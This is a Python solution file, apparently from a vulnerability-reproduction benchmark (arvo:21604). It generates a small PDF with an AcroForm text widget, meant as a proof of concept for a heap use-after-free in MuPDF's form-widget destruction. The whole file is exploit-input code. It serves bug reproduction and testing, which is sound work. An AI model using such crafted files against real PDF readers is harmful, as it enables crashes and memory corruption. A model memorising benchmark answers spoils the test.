import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
        The vulnerability (OSS-Fuzz 21604 / arvo:21604) exists in the destruction of form widgets
        where the reference count of the dictionary object is not correctly incremented
        during creation, leading to a double free (UAF) upon destruction.
        """
        # Construct a minimal valid PDF with a Form Widget (AcroForm)
        
        # PDF Objects content
        objects = [
            # 1. Catalog
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>",
            # 2. Pages
            b"<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>",
            # 3. Page (Points to the Annot)
            b"<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 200 200 ] /Annots [ 5 0 R ] >>",
            # 4. AcroForm (Points to the Field)
            b"<< /Fields [ 5 0 R ] >>",
            # 5. Widget Annotation (The vulnerable object structure)
            b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (Pwn) /Rect [ 10 10 100 50 ] >>"
        ]

        writer = io.BytesIO()
        writer.write(b"%PDF-1.7\n")
        
        # Write objects and track offsets for XREF
        offsets = []
        for i, content in enumerate(objects):
            obj_id = i + 1
            offsets.append(writer.tell())
            writer.write(f"{obj_id} 0 obj\n".encode())
            writer.write(content)
            writer.write(b"\nendobj\n")
            
        # Write XREF table
        xref_offset = writer.tell()
        writer.write(b"xref\n")
        writer.write(f"0 {len(objects) + 1}\n".encode())
        # First entry (special)
        writer.write(b"0000000000 65535 f \n")
        # Object entries
        for offset in offsets:
            writer.write(f"{offset:010} 00000 n \n".encode())
            
        # Write Trailer
        writer.write(b"trailer\n")
        writer.write(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode())
        writer.write(b"startxref\n")
        writer.write(f"{xref_offset}\n".encode())
        writer.write(b"%%EOF")
        
        return writer.getvalue()
